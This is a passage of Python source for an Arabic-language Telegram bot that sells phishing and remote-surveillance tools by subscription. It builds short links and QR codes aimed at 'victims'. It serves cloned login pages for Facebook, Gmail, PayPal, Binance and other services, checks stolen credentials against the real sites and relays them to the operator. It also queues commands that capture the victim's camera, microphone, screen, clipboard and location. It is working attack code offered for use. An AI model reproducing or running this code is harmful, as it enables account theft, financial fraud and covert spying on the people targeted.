            requests.post(
                f"{PUBLIC_URL}/lsh_create",
                json={"chat_id": chat_id, "session_id": session_id},
                timeout=5
            )
        except Exception as e:
            print(f"[-] LSH create HTTP warning: {e}")

        target_link = f"{PUBLIC_URL}/lsh?s={session_id}&id={chat_id}"
        qr_image = lsh_generate_qr(target_link)

        if qr_image:
            qr_image.name = 'lsh_qr.png'
            try:
                bot.send_photo(
                    chat_id, qr_image,
                    caption=(
                        "🕹️ **جلسة السيطرة الكاملة جاهزة!**\n"
                        "━━━━━━━━━━━━━━━━━━\n\n"
                        "🎯 **وجّه الضحية لمسح الكود أو افتح الرابط:**\n"
                        f"`{target_link}`\n\n"
                        "📊 **ما سيتم تلقائياً:**\n"
                        "• تقرير كامل عن الجهاز + IP الحقيقي\n"
                        "• صورة من الكاميرا الأمامية\n"
                        "• تسجيل صوتي من الميكروفون\n"
                        "• لوحة تحكم حية بأزرار تفاعلية\n\n"
                        "⚠️ الجلسة تنتهي بعد 24 ساعة."
                    ),
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"[-] send_photo error: {e}")
                bot.send_message(chat_id, f"🕹️ **رابط الجلسة:**\n`{target_link}`", parse_mode="Markdown")
        else:
            bot.send_message(chat_id, f"🕹️ **رابط الجلسة:**\n`{target_link}`", parse_mode="Markdown")
        return

    # ============================================================
    # ★★★ Session Hunter ★★★
    # ============================================================
    if call.data == "gen_sh":
        check = can_use_tool(chat_id, "sh")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "sh", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "sh")
        bot.answer_callback_query(call.id, "اختر الموقع...")

        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("📘 Facebook", callback_data=f"sh_site_facebook_{chat_id}"),
            InlineKeyboardButton("📷 Instagram", callback_data=f"sh_site_instagram_{chat_id}"),
        )
        markup.row(
            InlineKeyboardButton("🎵 TikTok", callback_data=f"sh_site_tiktok_{chat_id}"),
            InlineKeyboardButton("🐦 Twitter/X", callback_data=f"sh_site_twitter_{chat_id}"),
        )
        markup.row(
            InlineKeyboardButton("📧 Gmail", callback_data=f"sh_site_gmail_{chat_id}"),
            InlineKeyboardButton("👻 Snapchat", callback_data=f"sh_site_snapchat_{chat_id}"),
        )
        markup.row(
            InlineKeyboardButton("💼 LinkedIn", callback_data=f"sh_site_linkedin_{chat_id}"),
            InlineKeyboardButton("🎮 Discord", callback_data=f"sh_site_discord_{chat_id}"),
        )
        markup.row(
            InlineKeyboardButton("✈️ Telegram", callback_data=f"sh_site_telegram_{chat_id}"),
            InlineKeyboardButton("🎬 Netflix", callback_data=f"sh_site_netflix_{chat_id}"),
        )
        markup.row(
            InlineKeyboardButton("💳 PayPal", callback_data=f"sh_site_paypal_{chat_id}"),
            InlineKeyboardButton("💰 Binance", callback_data=f"sh_site_binance_{chat_id}"),
        )

        bot.send_message(
            chat_id,
            "🍪 **اختر الموقع المستهدف:**",
            reply_markup=markup,
            parse_mode="Markdown"
        )
        return

    if call.data.startswith("sh_site_"):
        parts = call.data.split("_", 3)
        site = parts[2]
        target_chat = parts[3] if len(parts) > 3 else str(chat_id)

        # ★★★ ولّد الرابط القصير ★★★
        short_code = generate_short_code(8)
        save_short_link(short_code, target_chat, site)

        # ★★★ الرابط القصير النهائي ★★★
        target_link = f"{PUBLIC_URL}/f/{short_code}"

        site_names = {
            "facebook": "فيسبوك", "instagram": "انستقرام",
            "tiktok": "تيك توك", "twitter": "تويتر / X",
            "gmail": "جيميل", "snapchat": "سناب شات",
            "linkedin": "لينكد إن", "discord": "ديسكورد",
            "telegram": "تلجرام", "netflix": "نتفليكس",
            "paypal": "باي بال", "binance": "بينانس",
        }

        bot.answer_callback_query(call.id, f"✅ {site_names.get(site, site)}")
        bot.send_message(
            chat_id,
            f"🎯 **جلسة {site_names.get(site, site)} جاهزة!**\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"🔗 **الرابط القصير:**\n`{target_link}`\n\n"
            f"📏 **الطول:** 45 حرف فقط\n"
            f"🔒 **مخفي تماماً** — لا يمكن تتبع Railway\n\n"
            f"📊 **ما سيحدث:**\n"
            f"• الضحية تفتح الرابط → ترى صفحة تسجيل دخول **{site_names.get(site, site)}** مطابقة 100%\n"
            f"• تكتب بياناتها الحقيقية\n"
            f"• **يتم التحقق مع السيرفر الحقيقي**\n"
            f"• **تُرسل لك فقط البيانات الصحيحة!**\n"
            f"• ثم تُحوَّل تلقائياً للموقع الحقيقي\n\n"
            f"⚠️ الرابط يعمل لمدة 7 أيام",
            parse_mode="Markdown"
        )
        return

    if call.data.startswith("sh_"):
        parts = call.data.split("_", 2)
        cmd = parts[1] if len(parts) > 1 else ""
        sid = parts[2] if len(parts) > 2 else None

        if cmd == "creds":
            data = get_sh_data(sid)
            creds = data.get("credentials", [])
            if creds:
                lines = [f"🎯 **البيانات المسروقة ({len(creds)}):**\n"]
                for i, c in enumerate(creds, 1):
                    verified = "✅" if c.get("verified") else "❌"
                    lines.append(
                        f"\n**#{i}** {verified}\n"
                        f"👤 `{c.get('username', '')}`\n"
                        f"🔑 `{c.get('password', '')}`\n"
                        f"🕐 {time.strftime('%H:%M:%S', time.localtime(c.get('captured_at', 0)))}"
                    )
                bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")
            else:
                bot.answer_callback_query(call.id, "لا توجد بيانات بعد", show_alert=True)

        elif cmd == "cookies":
            data = get_sh_data(sid)
            creds = data.get("credentials", [])
            if creds:
                text = json.dumps(creds, ensure_ascii=False, indent=2)
                buf = io.BytesIO(text.encode('utf-8'))
                buf.name = f'sh_creds_{sid[:8]}.json'
                bot.send_document(chat_id, buf, caption="🎯 **كل البيانات**")
            else:
                bot.answer_callback_query(call.id, "لا توجد بيانات بعد", show_alert=True)

        elif cmd == "stats":
            data = get_sh_data(sid)
            sess = data.get("session", {})
            creds = data.get("credentials", [])
            text = (
                f"📊 **إحصائيات الجلسة**\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🆔 `{sid[:16] if sid else 'N/A'}`\n"
                f"🎯 الموقع: `{sess.get('target_site', 'N/A')}`\n"
                f"🌐 IP: `{sess.get('ip', 'N/A')}`\n"
                f"📄 الصفحات: `{sess.get('page_views', 0)}`\n"
                f"🔑 البيانات: `{len(creds)}`\n"
                f"❌ المحاولات الفاشلة: `{sess.get('failed_attempts', 0)}`"
            )
            bot.send_message(chat_id, text, parse_mode="Markdown")

        elif cmd == "delete":
            bot.answer_callback_query(call.id, "✅ تم")
        return

    # ============================================================
    # أوامر RAT
    # ============================================================
    if call.data.startswith("rat_cam_"):
        target_chat_id = call.data.replace("rat_cam_", "")
        queue_command(target_chat_id, "snapshot")
        bot.answer_callback_query(call.id, "⏳ جاري التقاط الصورة من الضحية...")
        return

    if call.data.startswith("rat_mic_"):
        target_chat_id = call.data.replace("rat_mic_", "")
        queue_command(target_chat_id, "audio")
        bot.answer_callback_query(call.id, "⏳ جاري تسجيل الصوت من ميكروفون الضحية...")
        return

    # ============================================================
    # أوامر LSH
    # ============================================================
    if call.data.startswith("lsh_snap_"):
        sid = call.data.replace("lsh_snap_", "")
        ok = lsh_push_command(sid, {"action": "snapshot"})
        bot.answer_callback_query(call.id, "📸 جاري طلب الصورة..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_audio_"):
        sid = call.data.replace("lsh_audio_", "")
        ok = lsh_push_command(sid, {"action": "audio", "payload": {"duration": 6000}})
        bot.answer_callback_query(call.id, "🎙️ جاري التسجيل..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_video_"):
        sid = call.data.replace("lsh_video_", "")
        ok = lsh_push_command(sid, {"action": "video", "payload": {"duration": 10000}})
        bot.answer_callback_query(call.id, "🎥 جاري تسجيل الفيديو..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_screen_"):
        sid = call.data.replace("lsh_screen_", "")
        ok = lsh_push_command(sid, {"action": "screen"})
        bot.answer_callback_query(call.id, "🖥️ جاري التقاط الشاشة..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_clip_"):
        sid = call.data.replace("lsh_clip_", "")
        ok = lsh_push_command(sid, {"action": "clipboard"})
        bot.answer_callback_query(call.id, "📋 جاري سحب الحافظة..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_loc_"):
        sid = call.data.replace("lsh_loc_", "")
        ok = lsh_push_command(sid, {"action": "location"})
        bot.answer_callback_query(call.id, "📍 جاري تحديث الموقع..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_open_"):
        sid = call.data.replace("lsh_open_", "")
        bot.answer_callback_query(call.id, "🌐 أرسل الرابط الآن")
        _pending_open_url[chat_id] = sid
        bot.send_message(
            chat_id,
            "🌐 **أرسل الرابط الذي تريد فتحه على جهاز الضحية**\n"
            "(يجب أن يبدأ بـ http:// أو https://)"
        )
        return

    if call.data.startswith("lsh_vibrate_"):
        sid = call.data.replace("lsh_vibrate_", "")
        ok = lsh_push_command(sid, {"action": "vibrate", "payload": {"pattern": [500, 200, 500, 200, 500]}})
        bot.answer_callback_query(call.id, "📳 تم الإرسال" if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_kill_"):
        sid = call.data.replace("lsh_kill_", "")
        ok = lsh_push_command(sid, {"action": "redirect", "payload": {"url": "about:blank"}})
        bot.answer_callback_query(call.id, "❌ جاري الإنهاء..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return


# ============================================================
# معالجات الأدمن
# ============================================================
def admin_search_handler(message):
    if not is_admin(message.chat.id):
        return
    query = (message.text or "").strip().lstrip("@")
    users = get_all_users()
    found = []
    for u in users:
        if str(u.get("user_id")) == query or (u.get("username", "") or "").lower() == query.lower():
            found.append(u)
    
    if not found:
        bot.send_message(message.chat.id, f"❌ لم يتم العثور على: `{query}`", parse_mode="Markdown")
        return
    
    for u in found:
        uid = u.get("user_id")
        bot.send_message(
            message.chat.id,
            build_user_info_text(uid, u),
            reply_markup=build_user_detail_keyboard(uid, u),
            parse_mode="Markdown"
        )


def admin_broadcast_handler(message):
    if not is_admin(message.chat.id):
        return
    text = message.text
    if not text:
        return
    
    users = get_all_users()
    success = 0
    failed = 0
    
    status_msg = bot.send_message(message.chat.id, f"📢 جاري الإرسال لـ {len(users)} مستخدم...")
    
    for u in users:
        uid = u.get("user_id")
        if u.get("is_banned"):
            continue
        try:
            bot.send_message(uid, f"📢 **رسالة من الإدارة:**\n\n{text}", parse_mode="Markdown")
            success += 1
            time.sleep(0.05)
        except Exception:
            failed += 1
    
    try:
        bot.edit_message_text(
            f"✅ **تم الإرسال!**\n\n"
            f"✔️ النجاح: {success}\n"
            f"❌ الفشل: {failed}",
            chat_id=message.chat.id,
            message_id=status_msg.message_id
        )
    except Exception:
        pass


def admin_add_sub_handler(message):
    if not is_admin(message.chat.id):
        return
    try:
        uid = int((message.text or "").strip())
    except ValueError:
        bot.send_message(message.chat.id, "❌ ID غير صحيح")
        return
    
    user = get_or_create_user(uid)
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("⭐ أساسية", callback_data=f"admin_activate_basic_{uid}"),
        InlineKeyboardButton("💎 احترافية", callback_data=f"admin_activate_pro_{uid}"),
    )
    markup.row(InlineKeyboardButton("👑 VIP", callback_data=f"admin_activate_vip_{uid}"))
    
    bot.send_message(
        message.chat.id,
        f"📅 **اختر الباقة للمستخدم** `{uid}`:\n"
        f"👤 الاسم: {user.get('first_name', 'Unknown')}",
        reply_markup=markup,
        parse_mode="Markdown"
    )


def admin_ban_handler(message):
    if not is_admin(message.chat.id):
        return
    try:
        uid = int((message.text or "").strip())
    except ValueError:
        bot.send_message(message.chat.id, "❌ ID غير صحيح")
        return
    ban_user(uid)
    bot.send_message(message.chat.id, f"🚫 تم حظر `{uid}`", parse_mode="Markdown")
    try:
        bot.send_message(uid, "🚫 **تم حظرك من استخدام البوت.**", parse_mode="Markdown")
    except Exception:
        pass


def admin_unban_handler(message):
    if not is_admin(message.chat.id):
        return
    try:
        uid = int((message.text or "").strip())
    except ValueError:
        bot.send_message(message.chat.id, "❌ ID غير صحيح")
        return
    unban_user(uid)
    bot.send_message(message.chat.id, f"✅ تم فك حظر `{uid}`", parse_mode="Markdown")


def admin_delete_handler(message):
    if not is_admin(message.chat.id):
        return
    try:
        uid = int((message.text or "").strip())
    except ValueError:
        bot.send_message(message.chat.id, "❌ ID غير صحيح")
        return
    delete_user(uid)
    bot.send_message(message.chat.id, f"🗑️ تم حذف `{uid}`", parse_mode="Markdown")


def admin_grant_vip_handler(message):
    if not is_admin(message.chat.id):
        return
    try:
        uid = int((message.text or "").strip())
    except ValueError:
        bot.send_message(message.chat.id, "❌ ID غير صحيح")
        return
    user = get_or_create_user(uid)
    user["is_vip"] = True
    save_user(uid, user)
    bot.send_message(message.chat.id, f"💎 تم منح VIP لـ `{uid}`", parse_mode="Markdown")
    try:
        bot.send_message(uid,
            "💎 **تهانينا!**\n\n"
            "تم منحك عضوية **VIP** من الإدارة.\n"
            "يمكنك الآن استخدام كل الأدوات بدون أي حدود! 🚀",
            parse_mode="Markdown")
    except Exception:
        pass


def admin_give_stars_handler(message):
    if not is_admin(message.chat.id):
        return
    try:
        parts = (message.text or "").split("|")
        if len(parts) != 2:
            raise ValueError()
        uid = int(parts[0].strip())
        amount = int(parts[1].strip())
    except (ValueError, IndexError):
        bot.send_message(message.chat.id, "❌ صيغة خاطئة. استخدم: `user_id|amount`", parse_mode="Markdown")
        return
    
    user = get_or_create_user(uid)
    user["total_stars_spent"] = max(0, user.get("total_stars_spent", 0) - amount)
    save_user(uid, user)
    bot.send_message(message.chat.id,
        f"⭐ تم إعطاء `{amount}` نجمة لـ `{uid}`",
        parse_mode="Markdown")


def admin_msg_user_handler(message, uid):
    if not is_admin(message.chat.id):
        return
    try:
        bot.send_message(uid,
            f"📨 **رسالة من الإدارة:**\n\n{message.text}",
            parse_mode="Markdown")
        bot.send_message(message.chat.id, f"✅ تم الإرسال إلى `{uid}`", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ فشل الإرسال: {e}")


# ============================================================
# معالجة الرابط المُدخل
# ============================================================
_pending_open_url = {}


@bot.message_handler(func=lambda m: m.chat.id in _pending_open_url and m.text and m.text.startswith("http"))
def handle_open_url(message):
    sid = _pending_open_url.pop(message.chat.id, None)
    if sid:
        ok = lsh_push_command(sid, {"action": "url", "payload": {"url": message.text}})
        if ok:
            bot.send_message(message.chat.id, "✅ سيتم فتح الرابط على جهاز الضحية خلال ثانيتين")
        else:
            bot.send_message(message.chat.id, "❌ **فشل الإرسال** — تحقق من اتصال Redis")


# ============================================================
# تشغيل البوت
# ============================================================
def run_telegram_bot():
    print("[+] ============================================")
    print("[+] Starting Telegram Bot polling...")
    print(f"[+] Bot token: {BOT_TOKEN[:15]}...{BOT_TOKEN[-5:]}")
    print("[+] ============================================")

    try:
        r = requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
            params={"drop_pending_updates": "true"},
            timeout=15,
        )
        print(f"[+] deleteWebhook HTTP {r.status_code}: {r.text[:200]}")
    except Exception as e:
        print(f"[-] deleteWebhook HTTP error: {e}")

    try:
        r = requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/getWebhookInfo",
            timeout=15,
        )
        print(f"[+] getWebhookInfo: {r.text[:300]}")
    except Exception as e:
        print(f"[-] getWebhookInfo error: {e}")

    try:
        r = requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/getMe",
            timeout=15,
        )
        print(f"[+] getMe: {r.text[:200]}")
    except Exception as e:
        print(f"[-] getMe error: {e}")

    print("[+] Starting infinity_polling loop...")
    attempt = 0
    while True:
        try:
            attempt += 1
            print(f"[+] Polling attempt #{attempt}")
            bot.infinity_polling(
                skip_pending=True,
                timeout=30,
                long_polling_timeout=30,
                none_stop=True,
            )
        except Exception as e:
            print(f"[-] Polling crashed: {e}")
            print(f"[+] Restarting in 5 seconds...")
            time.sleep(5)


if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()

    time.sleep(2)

    port = int(os.environ.get("PORT", 8080))
    print(f"[+] Flask Web Server starting on port {port}...")
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
